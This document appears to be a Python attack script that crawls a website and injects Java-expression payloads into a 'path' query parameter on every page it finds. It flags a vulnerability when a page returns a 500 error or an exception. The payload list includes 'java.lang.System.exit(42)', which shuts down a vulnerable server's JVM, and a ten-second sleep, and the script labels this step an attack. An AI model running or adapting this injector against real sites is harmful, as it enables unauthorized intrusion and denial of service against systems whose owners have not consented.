import os
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import argparse

visited_urls = set()
payloads = [
    "java.lang.System.exit(42)",
    "java.lang.Thread.sleep(10000)",
    "/|java.lang.System.exit(42)",
    "|java.lang.System.exit(42)"
]

def scan_urls(base_url, url):
    try:
        response = requests.get(url)
        print(f"Scanning URL: {url} - Status Code: {response.status_code}")
        
        if response.status_code == 200:
            visited_urls.add(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                new_url = urljoin(url, link['href'])
                if new_url not in visited_urls and new_url.startswith(base_url):
                    scan_urls(base_url, new_url)
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

def attack_urls():
    vulnerability_detected = False

    for url in visited_urls:
        for payload in payloads:
            try:
                response = requests.get(url, params={'path': payload})
                print("URL:", url)
                print("Payload:", payload)
                print("Response Code:", response.status_code)
                print("Response Text:", response.text[:200])  # 첫 200자만 출력
                print("-" * 40)

                # Check for signs of successful exploit
                if response.status_code == 500 or "Exception" in response.text:
                    vulnerability_detected = True

            except requests.RequestException as e:
                print(f"Error accessing {url} with payload {payload}: {e}")

    return vulnerability_detected


def main(base_url):
    print("Scanning for available URLs...")
    initial_urls = [base_url]

    for start_url in initial_urls:
        scan_urls(base_url, start_url)

    print("Found URLs:", visited_urls)

    print("\nStarting attack on found URLs...")
    if attack_urls():
        print("Detected Vulnerability : True")
    else:
        print("Detected Vulnerability : False")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Recursive URL scanner and payload injector.")
    parser.add_argument("-u", "--url", required=True, help="Base URL to start scanning and attacking (e.g., 'http://localhost:8080').")
    args = parser.parse_args()

    main(args.url)
